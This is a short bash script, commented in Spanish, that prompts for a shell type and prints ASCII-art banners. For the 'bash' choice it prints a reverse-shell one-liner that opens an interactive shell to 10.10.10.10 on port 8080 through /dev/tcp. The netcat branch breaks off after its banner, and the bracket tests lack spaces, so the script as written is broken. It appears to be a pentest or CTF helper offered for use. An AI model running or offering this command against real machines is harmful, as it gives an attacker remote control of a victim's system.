#!/bin/bash
#colors
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

echo 
#Pregunta por el tipo de shell
echo -e "${purpleColour}[${yellowColour}*${purpleColour}]${turquoiseColour} Introduce el tipo de shell: ${endColour}"; read shell

#Reverse Shell Bash
if [ "$shell" == "bash"]

then

echo -e "${redColour}    ____                                   _____ __         ____   ____             __"
sleep 0.05
echo -e "   / __ \___ _   _____  _____________     / ___// /_  ___  / / /  / __ )____ ______/ /_"
sleep 0.05
echo -e "  / /_/ / _ \ | / / _ \/ ___/ ___/ _ \    \__ \/ __ \/ _ \/ / /  / __  / __ `/ ___/ __ \"
sleep 0.05
echo -e " / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / /  / /_/ / /_/ (__  ) / / /"
sleep 0.05
echo -e "/_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/  /_____/\__,_/____/_/ /_/${endColour}"
                                                                                        
echo -e "Use this: ${yellowColour} bash -i >& /dev/tcp/10.10.10.10/8080 0>&1 ${endColour}"

#Reverse Shell Netcat
elif [ "$shell" == "netcat"]

then

echo -e "${redColour}    ____                                   _____ __         ____   ____             __"
sleep 0.05
echo -e "   / __ \___ _   _____  _____________     / ___// /_  ___  / / /  / | / /__  / /__________ _/ /"
sleep 0.05
echo -e "  / /_/ / _ \ | / / _ \/ ___/ ___/ _ \    \__ \/ __ \/ _ \/ / /  / __  / __ `/ ___/ __ \"
sleep 0.05
echo -e " / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / /  / /|  /  __/ /_/ /__/ /_/ / /"
sleep 0.05
echo -e "/_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/  /_/ |_/\___/\__/\___/\__,_/\__/${endColour}"
